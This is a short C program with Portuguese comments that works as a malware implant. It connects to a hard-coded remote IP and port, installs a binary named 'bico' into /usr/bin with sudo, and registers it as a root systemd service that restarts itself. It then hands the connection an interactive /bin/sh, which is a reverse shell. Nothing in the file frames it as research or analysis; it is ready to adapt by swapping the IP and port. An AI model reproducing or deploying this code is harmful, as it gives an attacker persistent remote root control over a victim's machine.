#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <string.h>

int main() {
    int sock;
    struct sockaddr_in addr;
    char buffer;
    const char *ip = "54.232.216.110"; // trocar ip
    int port = 16499; // trocar porta

    sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0) {
        perror("Falha ao criar socket");
        return 1;
    }

    // Endereçamento
    memset(&addr, 0, sizeof(addr));
    addr.sin_family = AF_INET;
    addr.sin_port = htons(port);
    inet_pton(AF_INET, ip, &addr.sin_addr);

    if (connect(sock, (struct sockaddr*)&addr, sizeof(addr)) < 0) {
        perror("Falha ao conectar");
        return 1;
    }

    // Caminho do binário
    const char *bin_path = "/usr/bin/bico"; // Caminho onde o binário será copiado

    // Copiar o binário para /usr/bin/
    char cmd[512];
    snprintf(cmd, sizeof(cmd), "sudo cp ./bico /usr/bin/bico && sudo chmod +x /usr/bin/bico");
    system(cmd);

    // Criar o arquivo de serviço
    FILE *file = fopen("/tmp/bico.service", "w");
    if (file) {
        fprintf(file, "[Unit]\nDescription=bico service\nAfter=network.target\n\n");
        fprintf(file, "[Service]\nType=forking\nExecStart=%s\nRestart=always\nUser=root\nStandardOutput=journal\nStandardError=journal\nRestartSec=5\n\n", bin_path);
        fprintf(file, "[Install]\nWantedBy=multi-user.target\n");
        fclose(file);

        // Mover o serviço para o diretório correto e configurar o systemd
        system("sudo mv /tmp/bico.service /etc/systemd/system/bico.service");
        system("sudo systemctl daemon-reload");
        system("sudo systemctl enable bico.service");
        system("sudo systemctl start bico.service");
    } else {
        perror("Erro ao criar o arquivo de serviço");
        return 1;
    }

    // Redirecionar a entrada/saída para o socket
    dup2(sock, 0);
    dup2(sock, 1);
    dup2(sock, 2);

    // Executar shell
    execl("/bin/sh", "sh", NULL);

    return 0;
}
